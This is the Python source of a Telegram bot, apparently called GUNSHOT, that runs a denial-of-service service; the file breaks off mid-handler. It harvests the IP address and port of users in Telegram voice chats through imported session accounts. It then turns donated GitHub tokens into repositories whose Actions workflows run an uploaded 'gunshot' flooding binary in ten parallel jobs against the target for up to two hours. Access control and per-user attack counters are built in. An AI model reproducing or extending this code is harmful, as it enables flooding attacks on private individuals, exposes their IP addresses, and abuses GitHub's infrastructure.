import os, json, logging, time, uuid, asyncio, traceback, requests, random, zipfile, shutil, re
from datetime import datetime
from github import Github, GithubException
from pyrogram import Client, filters, enums
from pyrogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    InlineQueryResultArticle, InputTextMessageContent
)
from telethon import TelegramClient
from telethon.tl.functions.phone import JoinGroupCallRequest, LeaveGroupCallRequest
from telethon.tl.functions.channels import GetFullChannelRequest, JoinChannelRequest, LeaveChannelRequest
from telethon.tl.types import DataJSON, Channel, Chat
from telethon.tl.functions.messages import ImportChatInviteRequest, GetFullChatRequest
from telethon.errors import (
    FloodWaitError, UserAlreadyParticipantError, PeerFloodError,
    AuthKeyUnregisteredError, SessionRevokedError, UserDeactivatedBanError, UserDeactivatedError
)
from telethon.sessions import StringSession, SQLiteSession

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
_ADM = os.environ.get("ADMIN_IDS", "")
ADMIN_IDS = [int(x.strip()) for x in _ADM.split(",") if x.strip()]

if not BOT_TOKEN:
    print("❌ BOT_TOKEN missing!"); exit(1)
if not API_ID or not API_HASH:
    print("❌ API_ID/API_HASH missing!"); exit(1)
if not ADMIN_IDS:
    print("❌ ADMIN_IDS missing!"); exit(1)

# ============ PATHS ============
DATA_DIR = "data"
SESSION_DIR = "sessions"
FAILED_DIR = "failed_sessions"

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(SESSION_DIR, exist_ok=True)
os.makedirs(FAILED_DIR, exist_ok=True)

YML_FILE_PATH = ".github/workflows/main.yml"

logging.basicConfig(format='%(asctime)s | %(levelname)s | %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ============ GLOBALS ============
github_tokens = []
active_attacks = {}
attack_counters = {}
approved_users = {}
pending_users = {}
owners = {str(a): {"username": f"owner_{a}"} for a in ADMIN_IDS}
user_states = {}
pending_ip = {}
upload_pending = set()
sessions = {}
entity_cache = {}
current_token_index = 0
pyro: Client = None

# Binary cache
cached_binary = None
cached_binary_size = 0
cached_binary_time = None

# ============ DATA HELPERS ============
def data_path(f): return os.path.join(DATA_DIR, f)

def load_json(f, default=None):
    try:
        p = data_path(f)
        if os.path.exists(p):
            with open(p) as fh: return json.load(fh)
    except Exception as e: logger.error(f"Load {f}: {e}")
    return default if default is not None else {}

def save_json(f, d):
    try:
        with open(data_path(f), 'w') as fh: json.dump(d, fh, indent=2)
    except Exception as e: logger.error(f"Save {f}: {e}")

def init_data():
    global github_tokens, approved_users, pending_users, attack_counters
    github_tokens = load_json('github_tokens.json', [])
    approved_users = load_json('approved_users.json', {})
    pending_users = load_json('pending_users.json', {})
    attack_counters = load_json('attack_counters.json', {})

init_data()

# ============ PERMISSIONS ============
def is_owner(uid): return str(uid) in owners
def is_approved(uid): return is_owner(uid) or str(uid) in approved_users
def can_attack(uid): return is_approved(uid)

def approved_filter(_, __, m): return m.from_user and is_approved(m.from_user.id)
approved_only = filters.create(approved_filter)

def owner_filter(_, __, m): return m.from_user and is_owner(m.from_user.id)
owner_only = filters.create(owner_filter)

# ============ GITHUB HELPERS ============
def get_token_scopes(token):
    try:
        r = requests.get("https://api.github.com/user",
            headers={"Authorization": f"token {token}", "Accept": "application/vnd.github+json"},
            timeout=15)
        if r.status_code != 200: return None, None, r.status_code
        sc = [s.strip() for s in r.headers.get("x-oauth-scopes", "").split(",") if s.strip()]
        return r.json().get("login", "?"), sc, 200
    except Exception: return None, None, 0

def validate_token(token):
    try:
        if not token or len(token) < 20: return False, "Too short", True
        login, scopes, status = get_token_scopes(token)
        if status == 401: return False, "Invalid (401)", True
        if status == 403: return False, "Rate limit (403)", False
        if status != 200: return False, f"HTTP {status}", True
        if scopes:
            need = [s for s in ["repo", "workflow"] if s not in scopes]
            if need: return False, f"Missing: {', '.join(need)}", True
        return True, login, False
    except requests.exceptions.Timeout: return False, "Timeout", True
    except Exception as e: return False, str(e)[:60], True

def auto_remove_expired():
    global github_tokens
    if not github_tokens: return 0
    removed, valid = 0, []
    for td in github_tokens:
        ok, info, rm = validate_token(td.get('token', ''))
        if ok: td['username'] = info; valid.append(td)
        elif rm: removed += 1
        else: valid.append(td)
    if removed:
        github_tokens = valid; save_json('github_tokens.json', github_tokens)
    return removed

def build_workflow_yaml(ip, port, t, nonce):
    return f"""name: attack-{nonce}
on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
jobs:
  attack:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10]
    steps:
    - uses: actions/checkout@v4
    - run: ls -la && file gunshot || true
    - run: chmod +x gunshot
    - run: sudo ./gunshot {ip} {port} {t} 200
      continue-on-error: true
    - run: echo "nonce={nonce}"
"""

def ensure_workflow(repo, ip, port, t):
    nonce = uuid.uuid4().hex[:8]
    content = build_workflow_yaml(ip, port, t, nonce)
    try:
        ex = repo.get_contents(YML_FILE_PATH)
        repo.update_file(YML_FILE_PATH, f"attack {ip}:{port} [{nonce}]", content, ex.sha)
        return True, "updated"
    except GithubException as e:
        if e.status == 404:
            try:
                repo.create_file(YML_FILE_PATH, f"attack {ip}:{port} [{nonce}]", content)
                return True, "created"
            except GithubException as e2:
                if e2.status == 403: return False, "403: token missing 'workflow'"
                return False, f"create fail {e2.status}"
        if e.status == 403: return False, "403: token missing 'workflow'"
        return False, f"update fail {e.status}"
    except Exception as e: return False, str(e)[:80]

def push_binary_to_repo(g: Github, repo_name: str, content: bytes):
    try:
        repo = g.get_repo(repo_name)
        try:
            ex = repo.get_contents("gunshot")
            repo.update_file("gunshot", "update binary", content, ex.sha)
            msg = "✅ updated"
        except GithubException as ge:
            if ge.status == 404:
                repo.create_file("gunshot", "add binary", content)
                msg = "✅ created"
            else:
                return False, f"❌ {ge.status}"
        ensure_workflow(repo, "0.0.0.0", 1, 1)
        return True, msg
    except Exception as e:
        return False, f"❌ {str(e)[:40]}"

# ============ ATTACK STATE ============
def start_attack(aid, ip, port, t, uid):
    active_attacks[aid] = {"ip": ip, "port": port, "time": t, "user_id": uid,
                           "start_time": time.time(), "timer_task": None}
    save_json('attack_state.json', active_attacks)
    attack_counters[str(uid)] = attack_counters.get(str(uid), 0) + 1
    save_json('attack_counters.json', attack_counters)

def finish_attack(aid):
    if aid in active_attacks:
        tk = active_attacks[aid].get("timer_task")
        if tk and not tk.done(): tk.cancel()
        del active_attacks[aid]; save_json('attack_state.json', active_attacks)

def progress_bar(p, t, ln=12):
    if t <= 0: return "█" * ln
    f = int(min(1.0, p/t) * ln)
    return "█"*f + "░"*(ln-f)

# ============ SESSION HELPERS ============
def log(m): logger.info(m)

def is_dead(ex):
    return isinstance(ex, (AuthKeyUnregisteredError, SessionRevokedError,
                           UserDeactivatedBanError, UserDeactivatedError)) or \
           any(k in str(ex).lower() for k in ["method that is not", "auth_key_unregistered",
                                               "session_revoked", "user_deactivated"])

async def kill_session(sid, c):
    try:
        sf = getattr(c.session, 'filename', None)
        if sf:
            if not sf.endswith('.session'): sf += '.session'
            if os.path.exists(sf): shutil.move(sf, os.path.join(FAILED_DIR, os.path.basename(sf)))
    except: pass
    try: await c.disconnect()
    except: pass
    sessions.pop(sid, None)
    for k in [k for k in entity_cache if k[0] == sid]: del entity_cache[k]
    log(f"🗑️ S{sid} removed")

async def connect_c(c):
    if not c.is_connected(): await asyncio.wait_for(c.connect(), timeout=15)

async def resolve_entity(c, i, sid=None):
    key = (sid, i)
    if key in entity_cache: return entity_cache[key]
    i = i.strip(); entity = None
    if 't.me/' in i or i.startswith('+'):
        hp = (i.split('t.me/')[-1] if 't.me/' in i else i).split('?')[0].strip()
        if hp.startswith('+'):
            try: entity = (await c(ImportChatInviteRequest(hp[1:]))).chats[0]
            except UserAlreadyParticipantError as ex:
                if hasattr(ex, 'updates') and ex.updates and hasattr(ex.updates, 'chats') and ex.updates.chats:
                    entity = ex.updates.chats[0]
                else: raise ValueError("Already member. Use chat ID.")
        else:
            i = ('' if hp.startswith('@') else '@') + hp
    if not entity:
        ch = i.lstrip('@')
        if ch.lstrip('-').isdigit():
            cid = int(ch)
            try: entity = await c.get_entity(cid)
            except:
                for d in await c.get_dialogs():
                    if d.entity.id == abs(cid): entity = d.entity; break
                if not entity: raise ValueError(f"Not found: {cid}")
        else:
            try: entity = await c.get_entity(i if i.startswith('@') else int(i))
            except: entity = await c.get_entity(('@' if not i.startswith('@') else '') + i)
    entity_cache[key] = entity
    return entity

async def getip_task(sid, c, ci):
    await connect_c(c); ent = await resolve_entity(c, ci, sid)
    if isinstance(ent, Channel): fc = await c(GetFullChannelRequest(channel=ent))
    elif isinstance(ent, Chat):  fc = await c(GetFullChatRequest(chat_id=ent.id))
    else: raise ValueError("Unsupported chat")
    if not fc.full_chat.call: raise ValueError("No active voice chat")
    res = await c(JoinGroupCallRequest(
        call=fc.full_chat.call, join_as=await c.get_me(), muted=True, video_stopped=True,
        params=DataJSON(data=json.dumps({"ssrc": random.getrandbits(32)}))
    ))
    asyncio.create_task(c(LeaveGroupCallRequest(call=fc.full_chat.call, source=0)))
    data = json.loads(res.updates[-1].params.data)
    cands = data.get("transport", {}).get("candidates", [])
    if len(cands) < 2: raise ValueError(f"Only {len(cands)} candidates")
    ip, port = cands[1].get("ip"), cands[1].get("port")
    if not ip or not port: raise ValueError("IP/Port missing")
    return ip, port, getattr(ent, 'title', '?')

async def load_client(path, sid):
    try:
        c = TelegramClient(path, API_ID, API_HASH, connection_retries=2, timeout=15)
        await asyncio.wait_for(c.connect(), timeout=20)
        if await c.is_user_authorized():
            sessions[sid] = c; log(f"✅ S{sid}"); return True
        await c.disconnect()
    except Exception as ex: log(f"❌ {path}: {ex}")
    return False

async def load_all_sessions():
    files = sorted(f for f in os.listdir(SESSION_DIR) if f.endswith(".session"))
    if not files: return
    log(f"📂 Loading {len(files)} sessions...")
    sem = asyncio.Semaphore(10)
    async def lim(sf, i):
        async with sem:
            await asyncio.sleep(i * 0.05)
            return await load_client(os.path.join(SESSION_DIR, sf[:-8]), i + 1)
    await asyncio.gather(*[lim(sf, i) for i, sf in enumerate(files)])
    log(f"✅ {len(sessions)} loaded")

async def send_chunks(chat_id, lines):
    ok = sum(1 for l in lines if l.startswith("✅"))
    fl = sum(1 for l in lines if l.startswith("⏳"))
    dd = sum(1 for l in lines if l.startswith("🗑️"))
    summary = f"\n\n📊 Total:{len(lines)} ✅{ok} ⏳{fl} 🗑️{dd} ❌{len(lines)-ok-fl-dd}"
    chunks, cur, cur_len = [], [], 0
    for l in lines:
        if cur_len + len(l) > 3800:
            chunks.append(cur); cur, cur_len = [l], len(l)
        else:
            cur.append(l); cur_len += len(l) + 1
    if cur: chunks.append(cur)
    for i, ch in enumerate(chunks):
        pre = f"<b>Part {i+1}/{len(chunks)}</b>\n" if len(chunks) > 1 else ""
        suf = summary if i == len(chunks)-1 else ""
        await pyro.send_message(chat_id, pre + "\n".join(ch) + suf)

# ============ KEYBOARDS ============
def binary_status_str():
    if cached_binary:
        return f"✅ {cached_binary_size//1024} KB cached"
    return "❌ not uploaded"

def main_kb(uid):
    rows = [
        [InlineKeyboardButton("🚀 Manual Attack", callback_data="atk_start"),
         InlineKeyboardButton("🌐 Extract IP", callback_data="ip_start")],
        [InlineKeyboardButton("📡 Status", callback_data="status"),
         InlineKeyboardButton("🛑 Stop All", callback_data="stop")],
        [InlineKeyboardButton("🔑 My Tokens", callback_data="my_tokens"),
         InlineKeyboardButton("📦 Sessions", callback_data="sess_menu")],
        [InlineKeyboardButton("➕ Add Token", callback_data="addtoken_help"),
         InlineKeyboardButton("❓ Help", callback_data="help_menu")],
        [InlineKeyboardButton("ℹ️ About", callback_data="about_menu"),
         InlineKeyboardButton("🆔 My ID", callback_data="my_id")],
    ]
    if is_owner(uid):
        rows.append([InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(rows)

def back_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Menu", callback_data="back_start")]])
def admin_kb(): return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_panel")]])
def cancel_kb(cb="atk_cancel"): return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data=cb)]])

async def safe_edit(q, text, kb=None):
    try: await q.message.edit_text(text, reply_markup=kb, disable_web_page_preview=True)
    except Exception:
        try: await q.message.reply_text(text, reply_markup=kb, disable_web_page_preview=True)
        except: pass

# ============ CORE ATTACK ============
async def perform_attack(uid, ip, port, t, reply_target):
    global current_token_index
    auto_remove_expired()
    if not github_tokens:
        await reply_target.reply_text("❌ No tokens. Add with /addtoken", reply_markup=back_kb()); return
    attempts, last_err, valid_tok = [], None, None
    checked, safety = set(), 0
    while github_tokens and not valid_tok and safety < 30:
        safety += 1
        idx = None
        for off in range(len(github_tokens)):
            i2 = (current_token_index + off) % len(github_tokens)
            if github_tokens[i2].get('token','')[:20] not in checked: idx = i2; break
        if idx is None: break
        cand = github_tokens[idx]; checked.add(cand.get('token','')[:20])
        uname = cand.get('username', '?'); rm = False
        try:
            g = Github(cand['token']); repo = g.get_repo(cand['repo'])
            try: repo.get_contents("gunshot")
            except Exception:
                last_err = f"no binary @{uname}"; attempts.append(f"@{uname}: ❌ binary"); rm = True
                raise Exception(last_err)
            ok, info = ensure_workflow(repo, ip, port, t)
            if not ok:
                last_err = info; attempts.append(f"@{uname}: ❌ {info}")
                if any(x in info for x in ["401","403","404"]): rm = True
                raise Exception(last_err)
            valid_tok = cand
            current_token_index = (idx + 1) % len(github_tokens)
            attempts.append(f"@{uname}: ✅")
        except GithubException as e:
            last_err = f"GH {e.status}"; attempts.append(f"@{uname}: ❌ {e.status}")
            if e.status in (401, 403, 404): rm = True
        except Exception as e: last_err = str(e)[:80]
        if rm and not valid_tok:
            try: github_tokens.pop(idx); save_json('github_tokens.json', github_tokens)
            except: pass

    if not valid_tok:
        msg = "❌ <b>ALL TOKENS FAILED</b>\n\n" + "\n".join(attempts[-5:])
        msg += f"\n\nLast: <code>{last_err}</code>\nRemaining: <b>{len(github_tokens)}</b>"
        await reply_target.reply_text(msg, reply_markup=back_kb()); return

    aid = f"{ip}:{port}:{int(time.time())}:{uuid.uuid4().hex[:4]}"
    start_attack(aid, ip, port, t, uid)
    async def auto_fin(): await asyncio.sleep(t + 10); finish_attack(aid)
    task = asyncio.create_task(auto_fin())
    active_attacks[aid]["timer_task"] = task

    threat = "🟢 MODERATE" if t <= 60 else ("🟡 HIGH" if t <= 300 else "🔴 CRITICAL")
    msg = (
        f"<b>🔫 GUNSHOT DEPLOYED</b>\n\n"
        f"<b>Target</b>   : <code>{ip}:{port}</code>\n"
        f"<b>Duration</b> : <code>{t}s</code>\n"
        f"<b>Threat</b>   : {threat}\n"
        f"<b>Token</b>    : @{valid_tok['username']}\n"
        f"<b>ID</b>       : <code>{aid}</code>\n\n"
        f"<i>Shot #{attack_counters.get(str(uid), 0)}</i>"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("👁️ Actions", url=f"https://github.com/{valid_tok['repo']}/actions")],
        [InlineKeyboardButton("📡 Status", callback_data="status"),
         InlineKeyboardButton("🛑 Stop", callback_data="stop")],
        [InlineKeyboardButton("🔙 Menu", callback_data="back_start")]
    ])
    await reply_target.reply_text(msg, reply_markup=kb, disable_web_page_preview=True)

# ============ IP EXTRACT ============
async def do_extract_ip(uid, chat_link, sid_or_auto, reply_target):
    w = await reply_target.reply_text("🔍 Extracting IP...")
    try:
        if sid_or_auto == 'auto':
            if not sessions:
                await w.edit_text("❌ No sessions available", reply_markup=back_kb()); return
            ip = port = title = None; used_sid = None
            for sid, cl in sorted(sessions.items()):
                try:
                    ip, port, title = await getip_task(sid, cl, chat_link)
                    used_sid = sid; break
                except Exception as e:
                    logger.warning(f"S{sid} failed: {e}"); continue
            if not used_sid:
                await w.edit_text("❌ All sessions failed", reply_markup=back_kb()); return
        else:
            sid = int(sid_or_auto)
            if sid not in sessions:
                await w.edit_text(f"❌ S{sid} not found", reply_markup=back_kb()); return
            ip, port, title = await getip_task(sid, sessions[sid], chat_link)
            used_sid = sid

        pending_ip[uid] = {'ip': ip, 'port': port, 'title': title}
        user_states.pop(uid, None)
        await w.edit_text(
            f"<b>🛜 IP EXTRACTED</b>\n\n"
            f"<b>Session:</b> S{used_sid}\n"
            f"<b>Chat:</b> {title}\n"
            f"<b>IP:</b> <code>{ip}</code>\n"
            f"<b>Port:</b> <code>{port}</code>\n\n"
            f"<i>Tap below to attack 🚀</i>",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 Attack 30s", callback_data="use_ip_30"),
                 InlineKeyboardButton("🚀 Attack 60s", callback_data="use_ip_60")],
                [InlineKeyboardButton("🚀 Attack 120s", callback_data="use_ip_120"),
                 InlineKeyboardButton("⚙️ Custom", callback_data="use_ip_custom")],
                [InlineKeyboardButton("🔄 Extract Again", callback_data="ip_start")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_start")]
            ]))
    except Exception as e:
        await w.edit_text(f"❌ Extract failed: <code>{str(e)[:150]}</code>", reply_markup=back_kb())

# ============ START ============
@Client.on_message(filters.command("start"))
async def cmd_start(c, m):
    try:
        uid = m.from_user.id
        if not is_approved(uid):
            if str(uid) not in pending_users:
                pending_users[str(uid)] = {"username": m.from_user.username or "?", "date": datetime.now().isoformat()}
                save_json('pending_users.json', pending_users)
                for oid in owners:
                    try: await c.send_message(int(oid), f"📥 <b>Access Request</b>\n👤 @{m.from_user.username}\n🆔 <code>{uid}</code>\n<code>/approve {uid} 7</code>")
                    except: pass
            await m.reply_text("⛔ <b>Access Denied</b>\nRequest sent to admin.", reply_markup=back_kb()); return
        role = "👑 OWNER" if is_owner(uid) else "✅ APPROVED"
        total = sum(attack_counters.values()); mine = attack_counters.get(str(uid), 0)
        await m.reply_text(
            f"<b>🔫 GUNSHOT v4.2</b>\n\n👤 @{m.from_user.username or '?'}\n👑 {role}\n"
            f"🔄 Tokens: {len(github_tokens)}\n📦 Sessions: {len(sessions)}\n"
            f"💾 Binary: {binary_status_str()}\n"
            f"💥 Kills: {mine}\n🌐 Global: {total}\n\n"
            f"<i>Select an option below 👇</i>",
            reply_markup=main_kb(uid))
    except Exception: logger.error(traceback.format_exc())

@Client.on_message(filters.command("help"))
async def cmd_help(c, m):
    txt = (
        "<b>🔫 COMMANDS</b>\n\n"
        "<b>⚔️ ATTACK</b>\n"
        "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n"
        "<code>/status</code> <code>/stop</code>\n\n"
        "<b>🔑 TOKENS</b>\n"
        "<code>/addtoken &lt;token&gt;</code>\n<code>/mytokens</code>\n\n"
        "<b>📦 SESSIONS</b>\n"
        "<code>/addsession &lt;string&gt;</code>\n"
        "<code>/delsession &lt;sid&gt;</code>\n<code>/sessions</code>\n"
        "<code>/join &lt;sid|all&gt; &lt;chat&gt;</code>\n"
        "<code>/leave &lt;sid|all&gt; &lt;chat&gt;</code>\n"
        "<code>/getip &lt;sid&gt; &lt;chat&gt;</code>\n"
        "Send .zip to bulk load\n\n"
        "<b>👥 USERS (owner)</b>\n"
        "<code>/approve</code> <code>/remove</code> <code>/users</code>\n"
        "<code>/pending</code> <code>/broadcast</code>\n\n"
        "<b>🔧 ADMIN</b>\n"
        "<code>/binary_upload</code> — once, all new tokens auto-get it\n"
        "<code>/clearbinary</code> — remove cache\n"
        "<code>/tokens</code> <code>/checktokens</code>\n"
        "<code>/cleartokens confirm</code>\n"
        "<code>/maintenance</code>"
    )
    await m.reply_text(txt, reply_markup=back_kb())

# ============ ATTACK COMMAND ============
@Client.on_message(filters.command("attack"))
async def cmd_attack(c, m):
    try:
        uid = m.from_user.id
        if not can_attack(uid): await m.reply_text("⛔"); return
        if len(m.command) != 4:
            await m.reply_text("📖 <code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🚀 Or use button flow", callback_data="atk_start")]])); return
        ip, port_s, time_s = m.command[1], m.command[2], m.command[3]
        try: port, t = int(port_s), int(time_s)
        except: await m.reply_text("❌ Numbers only"); return
        if not (1 <= port <= 65535): await m.reply_text("❌ Port 1-65535"); return
        if not (5 <= t <= 7200): await m.reply_text("❌ Time 5-7200"); return
        await perform_attack(uid, ip, port, t, m)
    except Exception: logger.error(traceback.format_exc())

# ============ ADD TOKEN (auto binary) ============
@Client.on_message(filters.command("addtoken"))
async def cmd_addtoken(c, m):
    try:
        uid = m.from_user.id
        if not can_attack(uid): await m.reply_text("⛔"); return
        if len(m.command) != 2:
            await m.reply_text("📖 <code>/addtoken &lt;token&gt;</code>\n\nNeed: <b>repo</b> + <b>workflow</b>"); return
        token = m.command[1].strip()
        w = await m.reply_text("🔍 Validating...")
        ok, info, _ = validate_token(token)
        if not ok:
            await w.edit_text(f"❌ <b>Invalid</b>\n\n{info}\n\nhttps://github.com/settings/tokens/new"); return
        for t in github_tokens:
            if t.get('token') == token or t.get('username') == info:
                await w.edit_text(f"⚠️ Already: @{info}"); return
        await w.edit_text(f"✅ @{info}\n⏳ Creating repo...")
        g = Github(token); user = g.get_user()
        rn = f"gunshot-{uuid.uuid4().hex[:8]}"
        user.create_repo(rn, private=False, auto_init=True); await asyncio.sleep(3)
        repo_full = f"{info}/{rn}"
        try:
            repo = g.get_repo(repo_full)
            repo.create_file(YML_FILE_PATH, "init", "name: idle\non: workflow_dispatch\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n    - run: echo ok\n")
        except: pass

        binary_msg = ""
        if cached_binary:
            await w.edit_text(f"✅ @{info}\n⏳ Uploading binary from cache...")
            b_ok, b_msg = push_binary_to_repo(g, repo_full, cached_binary)
            binary_msg = f"\n💾 Binary: {b_msg} (from cache)"
            logger.info(f"Auto-binary @{info}: {b_ok} {b_msg}")
        else:
            binary_msg = "\n💾 Binary: ⚠️ not cached — ask owner to /binary_upload"

        github_tokens.append({'token': token, 'username': info, 'repo': repo_full,
            'added_at': datetime.now().isoformat(), 'added_by': uid})
        save_json('github_tokens.json', github_tokens)
        await w.edit_text(
            f"<b>🔑 TOKEN ADDED</b>\n\n👤 @{info}\n📁 <code>{rn}</code>\n📊 Vault: {len(github_tokens)}{binary_msg}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 Attack Now", callback_data="atk_start")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_start")]]))
    except Exception as e:
        logger.error(traceback.format_exc())
        try: await m.reply_text(f"❌ {str(e)[:150]}")
        except: pass

@Client.on_message(filters.command("mytokens"))
async def cmd_mytokens(c, m):
    uid = m.from_user.id
    if not can_attack(uid): await m.reply_text("⛔"); return
    mine = [t for t in github_tokens if t.get('added_by') == uid]
    msg = "<b>🔑 YOUR TOKENS</b>\n\n" if mine else "📭 None"
    for i, t in enumerate(mine, 1):
        msg += f"{i}. @{t.get('username','?')} – <code>{t['token'][:10]}…</code>\n"
    if cached_binary:
        msg += f"\n💾 Binary cache: {cached_binary_size//1024} KB (auto-applied)"
    await m.reply_text(msg, reply_markup=back_kb())

@Client.on_message(filters.command("tokens") & owner_only)
async def cmd_tokens(c, m):
    rm = auto_remove_expired()
    if not github_tokens: msg = "📭 Empty."
    else:
        msg = "<b>🔐 TOKENS</b>\n\n"
        for i, t in enumerate(github_tokens, 1):
            msg += f"{i}. @{t.get('username','?')} – <code>{t['token'][:10]}…</code>\n   <code>{t['repo']}</code>\n\n"
        msg += f"Total: {len(github_tokens)}"
        if rm: msg += f"\n🧹 Removed: {rm}"
    msg += f"\n💾 Binary cache: {binary_status_str()}"
    await m.reply_text(msg, reply_markup=admin_kb())

@Client.on_message(filters.command("checktokens") & owner_only)
async def cmd_checktokens(c, m):
    rm = auto_remove_expired()
    msg = f"<b>🔍 HEALTH</b>\n\nTotal: {len(github_tokens)}\nRemoved: {rm}\n"
    msg += f"💾 Binary cache: {binary_status_str()}\n\n"
    for i, t in enumerate(github_tokens[:15], 1):
        ok, info, _ = validate_token(t['token'])
        msg += f"{i}. @{t.get('username','?')}: {'✅' if ok else '⚠️'}\n"
    if len(github_tokens) > 15: msg += f"…+{len(github_tokens)-15}"
    await m.reply_text(msg, reply_markup=admin_kb())

@Client.on_message(filters.command("cleartokens") & owner_only)
async def cmd_cleartokens(c, m):
    if len(m.command) == 2 and m.command[1].lower() == "confirm":
        n = len(github_tokens); github_tokens.clear(); save_json('github_tokens.json', github_tokens)
        await m.reply_text(f"🗑️ Cleared {n}.", reply_markup=admin_kb())
    else:
        await m.reply_text(f"⚠️ Use <code>/cleartokens confirm</code> to delete {len(github_tokens)}.", reply_markup=admin_kb())

@Client.on_message(filters.command("removetoken"))
async def cmd_removetoken(c, m):
    uid = m.from_user.id
    if len(m.command) != 2: await m.reply_text("📖 /removetoken &lt;token&gt;"); return
    tok = m.command[1]
    for i, t in enumerate(github_tokens):
        if t.get('token') == tok:
            if is_owner(uid) or t.get('added_by') == uid:
                github_tokens.pop(i); save_json('github_tokens.json', github_tokens)
                await m.reply_text(f"✅ Removed. Total: {len(github_tokens)}", reply_markup=back_kb()); return
            else: await m.reply_text("⛔ No permission"); return
    await m.reply_text("❌ Not found", reply_markup=back_kb())

@Client.on_message(filters.command("binary_upload") & owner_only)
async def cmd_binary_upload(c, m):
    upload_pending.add(m.from_user.id)
    cache_note = ""
    if cached_binary:
        cache_note = f"\n\n💾 Current cache: {cached_binary_size//1024} KB — new upload will replace it."
    await m.reply_text(
        f"📤 <b>DEPLOY BINARY</b>\n\nSend <code>gunshot</code> file.\n"
        f"<i>Once uploaded, all future tokens get it automatically until restart.</i>{cache_note}\n\n/cancel to abort.")

@Client.on_message(filters.command("clearbinary") & owner_only)
async def cmd_clearbinary(c, m):
    global cached_binary, cached_binary_size, cached_binary_time
    if not cached_binary:
        await m.reply_text("📭 No binary cached", reply_markup=admin_kb()); return
    cached_binary = None; cached_binary_size = 0; cached_binary_time = None
    await m.reply_text("🗑️ Binary cache cleared. New tokens won't auto-get binary.", reply_markup=admin_kb())

@Client.on_message(filters.command("cancel"))
async def cmd_cancel(c, m):
    uid = m.from_user.id
    upload_pending.discard(uid); user_states.pop(uid, None)
    await m.reply_text("❌ Cancelled", reply_markup=back_kb())

# ============ DOCUMENT HANDLER ============
@Client.on_message(filters.document & approved_only)
async def handle_document(c, m):
    global cached_binary, cached_binary_size, cached_binary_time
    uid = m.from_user.id
    fname = (m.document.file_name or "").lower()

    if uid in upload_pending:
        upload_pending.discard(uid)
        if not fname.startswith("gunshot"):
            await m.reply_text(f"❌ Must be named <code>gunshot</code>. Got: <code>{m.document.file_name}</code>"); return
        status = await m.reply_text("⏳ Downloading...")
        try:
            fp = await m.download(f"temp_{m.document.file_id}.bin")
            with open(fp, 'rb') as f: content = f.read()
            os.remove(fp)

            cached_binary = content
            cached_binary_size = len(content)
            cached_binary_time = datetime.now()
            logger.info(f"💾 Binary cached: {cached_binary_size//1024} KB")

            await status.edit_text(f"💾 Cached {len(content)//1024} KB\n⏳ Uploading to {len(github_tokens)} existing repos...")
            succ, fail, results = 0, 0, []
            for td in list(github_tokens):
                uname = td.get('username', '?')
                try:
                    g = Github(td['token'])
                    ok, msg = push_binary_to_repo(g, td['repo'], content)
                    if ok:
                        results.append((uname, msg)); succ += 1
                    else:
                        results.append((uname, msg)); fail += 1
                        if "401" in msg or "403" in msg or "404" in msg:
                            try: github_tokens.remove(td); save_json('github_tokens.json', github_tokens)
                            except: pass
                except Exception as e:
                    results.append((uname, f"❌ {str(e)[:30]}")); fail += 1
            msg = f"<b>✅ BINARY CACHED</b>\n💾 {cached_binary_size//1024} KB\n✅ {succ} | ❌ {fail}\n\n"
            for u, s in results: msg += f"@{u}: {s}\n"
            msg += f"\n📊 Total: {len(github_tokens)}"
            msg += f"\n\n🔥 <b>All future /addtoken will auto-get this binary!</b>"
            await status.edit_text(msg, reply_markup=admin_kb())
        except Exception as e:
            await status.edit_text(f"❌ {str(e)[:150]}", reply_markup=admin_kb())
        return

    if fname.endswith('.zip') and is_owner(uid):
        status = await m.reply_text("⏳ Loading sessions from ZIP...")
        try:
            zp = await m.download(f"temp_zip_{uuid.uuid4().hex[:6]}.zip")
            if not zipfile.is_zipfile(zp): await status.edit_text("❌ Invalid ZIP"); os.remove(zp); return
            sfs = []
            with zipfile.ZipFile(zp) as z:
                for info in z.infolist():
                    name = os.path.basename(info.filename)
                    if not name.endswith(".session"): continue
                    try:
                        with open(os.path.join(SESSION_DIR, name), 'wb') as f: f.write(z.read(info.filename))
                        sfs.append(name)
                    except: pass
            if not sfs: await status.edit_text("❌ No .session files"); os.remove(zp); return
            nid = max(sessions.keys()) + 1 if sessions else 1
            loaded = failed = 0; lock = asyncio.Lock(); sem = asyncio.Semaphore(10)
            async def try_load(sf):
                nonlocal nid, loaded, failed
                async with sem:
                    try:
                        cl = TelegramClient(os.path.join(SESSION_DIR, sf[:-8]), API_ID, API_HASH, connection_retries=2, timeout=15)
                        await asyncio.wait_for(cl.connect(), timeout=20)
                        if await cl.is_user_authorized():
                            async with lock: sessions[nid] = cl; nid += 1; loaded += 1
                        else:
                            await cl.disconnect()
                            async with lock: failed += 1
                    except Exception:
                        async with lock: failed += 1
            await asyncio.gather(*[try_load(sf) for sf in sfs])
            os.remove(zp)
            await status.edit_text(
                f"<b>📦 SESSIONS LOADED</b>\n\n✅ {loaded}\n❌ {failed}\n📊 Total: {len(sessions)}",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("📦 Sessions", callback_data="sess_menu")],
                    [InlineKeyboardButton("🔙 Menu", callback_data="back_start")]]))
